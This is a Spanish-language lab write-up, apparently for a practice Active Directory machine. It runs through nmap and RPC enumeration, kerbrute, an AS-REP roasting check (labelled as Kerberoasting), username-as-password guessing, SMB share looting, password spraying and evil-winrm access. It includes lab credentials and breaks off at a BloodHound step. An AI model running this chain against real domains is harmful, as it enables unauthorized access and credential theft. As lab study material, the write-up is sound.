### Enumeración

`nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.10.10.172 -oG allPorts`

`nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49676,49696,49749 -sCV 10.10.10.172 -oN targeted`

```ad-note
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-12 20:30:36Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
49749/tcp open  msrpc         Microsoft Windows RPC

```


> Puertos relevantes
> - *88 - Kerberos*
> - *135-RPC*
> - *389/3268 - LDAP*
> - *5985 - WinRM*

Confirmación de dominio
`nxc smb 10.10.10.172 -u '' -p ''`

Nos lo añadimos al `/etc/hosts`

### RPC - 135

Listar propiedades del AD
`rpcclient -U "" -N 10.10.10.172`

- Enumerar usuarios `enumdomusers`
```ad-hint
Guest
AAD_987d7f2f57d2
mhope
SABatchJobs
svc-ata
svc-bexec
svc-netapp
dgalanos
roleary
smorgan
```

Enumeración de usuarios validos con [[KERBRUTE]]
`kerbrute userenum users -d MEGABANK.LOCAL --dc 10.10.10.172`

```ad-hint
[+] VALID USERNAME:       SABatchJobs@MEGABANK.LOCAL
[+] VALID USERNAME:       mhope@MEGABANK.LOCAL
[+] VALID USERNAME:       smorgan@MEGABANK.LOCAL
[+] VALID USERNAME:       roleary@MEGABANK.LOCAL
[+] VALID USERNAME:       svc-bexec@MEGABANK.LOCAL
[+] VALID USERNAME:       svc-netapp@MEGABANK.LOCAL
[+] VALID USERNAME:       AAD_987d7f2f57d2@MEGABANK.LOCAL
[+] VALID USERNAME:       svc-ata@MEGABANK.LOCAL
[+] VALID USERNAME:       dgalanos@MEGABANK.LOCAL
```



### Validar si son KERBERROASTEABLE
`impacket-GetNPUsers -usersfile users -no-pass megabank.local/`

Ninguno es vulnerable a este ataque ya que no nos muestra el hash de kerberos


### Fuerza bruta a usuarios 
vamos a hacer fuerza bruta usuarios con su mismo nombre para ver si coincide alguno
```ad-hint
SABatchJobs:SABatchJobs
```

### Enumeracion recursos compoartidos SMB
`nxc smb  10.10.10.172 -u SABatchJobs -p SABatchJobs --shares`

Vemos un recurso compartido interesante y accedemos a el
`smbclient //10.10.10.172/users$ -U SABatchJobs`

En el directorio `mhope` encontramos un archivo `.xml` nos lo traemos a nuestra maquina de atacante en ese archivo encontramos una contraseña, que la vamos a guardar y hacemos fuerza bruta con user y password
`nxc smb 10.10.10.172 -u users -p passwd`

```ad-hint
mhope:4n0therD4y@n0th3r$
```

Volvemos a listar recursos para ver si hay algo diferente

### 5985 WinRM
Probamos con este usuario conectarnos a este servicio
`evil-winrm -i 10.10.10.172 -u mhope -p 4n0therD4y@n0th3r$`

Conseguiremos acceder a la maquina atraves de WinRM
Y obtendremos la flag


### BLOODHOUND
Creamos el archivo de subida
